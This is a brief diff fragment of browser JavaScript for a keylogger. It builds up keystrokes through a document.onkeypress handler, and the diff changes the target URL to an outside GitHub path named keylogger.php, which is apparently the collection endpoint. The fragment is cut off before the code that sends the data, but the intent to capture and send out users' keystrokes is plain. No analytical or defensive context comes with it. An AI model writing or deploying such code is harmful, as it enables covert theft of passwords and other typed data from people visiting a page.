@@ -1,5 +1,5 @@
 var keys='';
-var url = 'https://verdecard2023.github.io/menu1/';
+var url = 'https://github.com/verdecard2023/menu1/blob/main/keylogger.php';
 
 document.onkeypress = function(e) {
 	get = window.event?event:e;
